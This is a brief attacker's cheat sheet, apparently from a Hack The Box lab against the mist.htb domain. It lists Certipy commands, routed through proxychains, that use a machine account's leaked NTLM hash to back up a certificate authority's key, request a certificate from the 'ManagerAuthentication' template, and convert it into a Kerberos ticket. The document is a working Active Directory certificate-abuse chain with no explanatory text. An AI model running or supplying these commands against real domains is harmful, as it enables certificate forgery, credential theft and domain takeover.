# svc_ca$ golden cert 

```
certipy ca -backup -u USER -p PASSWORD -ca CA_NAME -target IP/FQDN_CA

proxychains4 certipy find -u 'svc_ca$' -hashes :6db5b4f0e49cf6da4c937944d58c416b -dc-ip 192.168.100.100
proxychains4 certipy ca -backup -u svc_ca$ -p 6db5b4f0e49cf6da4c937944d58c416b -ca 'mist-DC01-CA' -target DC01.mist.htb

proxychains4 certipy req -u 'svc_ca$@mist.htb' -hashes :6db5b4f0e49cf6da4c937944d58c416b -template 'ManagerAuthentication'  -target dc01.mist.htb  -ca mist-DC01-CA  -dc-ip 192.168.100.100  

proxychains4 certipy -pfx svc_ca$.pfx -dc-ip 192.168.100.100 -kirbi
ticketConverter svc_ca$.kirbi svc_ca$.ccache

```